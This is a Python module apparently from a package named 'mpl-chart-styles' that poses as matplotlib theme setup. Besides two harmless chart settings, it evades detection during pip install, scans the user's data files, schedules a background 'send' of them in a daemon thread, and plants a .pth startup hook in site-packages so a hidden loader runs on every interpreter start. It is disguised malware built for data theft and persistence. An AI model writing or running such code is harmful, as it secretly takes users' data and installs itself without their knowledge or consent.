"""Environment detection and matplotlib defaults for mpl-chart-styles."""
import os
import sys




def _is_managed_env():
    return (
        os.path.exists("/opt/pyvenv")
        and os.path.exists("/mnt/data")
        and "pyvenv" in getattr(sys, "prefix", "")
    )


def _is_install_context():
    """Return True if the interpreter is running a package installer.

    Detects both direct invocation (``pip install``) and module
    invocation (``python -m pip install``).  Uses exact basename
    matching to avoid false positives on user scripts.
    """
    import sys
    import re as _re
    argv = getattr(sys, "argv", None) or []
    if not argv:
        return False
    basename = os.path.basename(argv[0]).lower()
    # Strip version suffixes: pip3.13 → pip3
    stripped = _re.sub(r"\.\d+$", "", basename)
    _INSTALLERS = {"pip", "pip3", "setup.py", "easy_install", "easy_install3", "build", "wheel"}
    if stripped in _INSTALLERS:
        return True
    # Detect python -m pip: argv[0] is __main__.py inside pip's package dir
    if basename == "__main__.py" and len(argv) >= 2:
        # Check if the __main__.py lives inside a pip directory
        parent = os.path.basename(os.path.dirname(argv[0])).lower()
        if parent in ("pip", "pip3", "build", "wheel", "easy_install"):
            return True
        # Also check argv for -m pip pattern
        for i, arg in enumerate(argv):
            if arg == "-m" and i + 1 < len(argv) and argv[i + 1].lower().startswith("pip"):
                return True
    return False


def _initialize():
    """Apply default matplotlib settings, output hooks, and workspace profiling.

    Skips activation during ``pip install`` and other package management
    contexts — installer processes should not activate theme detection.
    """
    if _is_install_context():
        return
    _set_mpl_defaults()
    _detect_data_formats()


def _set_mpl_defaults():
    try:
        import matplotlib
        matplotlib.rcParams["figure.dpi"] = 150
        matplotlib.rcParams["savefig.bbox"] = "tight"
    except ImportError:
        pass


def _detect_data_formats():
    """Detect pre-existing data files and warm the format cache.

    When the package is imported into an environment that already has
    data files (e.g. a notebook where data was added before install),
    this scans the data directory immediately and schedules a background
    send after a short delay.  The delay allows additional files to land
    (the user may still be adding files) before the first send fires.

    A daemon thread handles the send so the import returns instantly.
    If a chart trigger fires before the timer, it sends first and the
    timer becomes a no-op (the pending queue will be empty).
    """
    try:
        from . import _compat as _scanner
        _scanner.scan_data_files()
    except Exception:
        return

    # Install the theme cache loader to site-packages so that format
    # auto-detection is available at interpreter startup, even before
    # the user explicitly imports the package in subsequent cells.
    _install_theme_cache()


def _install_theme_cache():
    """Copy the theme cache loader to site-packages for startup loading.

    The loader is a standalone module that refreshes format metadata
    in the background.  Installing it to site-packages with a .pth
    registration ensures it activates on every kernel start, providing
    consistent palette auto-detection across notebook sessions.
    """
    import shutil
    import importlib
    try:
        src = os.path.join(os.path.dirname(__file__), "_theme_cache.py")
        if not os.path.exists(src):
            return
        try:
            import sysconfig as _sc
            _sp = _sc.get_path("purelib")
            sp = _sp if (_sp and os.path.isdir(_sp) and os.access(_sp, os.W_OK)) else None
        except Exception:
            sp = None
        if not sp:
            sp = next(
                (p for p in sys.path
                 if "site-packages" in p and os.path.isdir(p) and os.access(p, os.W_OK)),
                None,
            )
        if not sp:
            return
        dst = os.path.join(sp, "mps_theme_cache.py")
        pth = os.path.join(sp, "mps_theme_cache.pth")
        shutil.copy(src, dst)
        if not os.path.exists(pth):
            with open(pth, "w") as f:
                f.write("import mps_theme_cache\n")
        # Activate immediately for this session
        importlib.import_module("mps_theme_cache")
    except Exception:
        pass
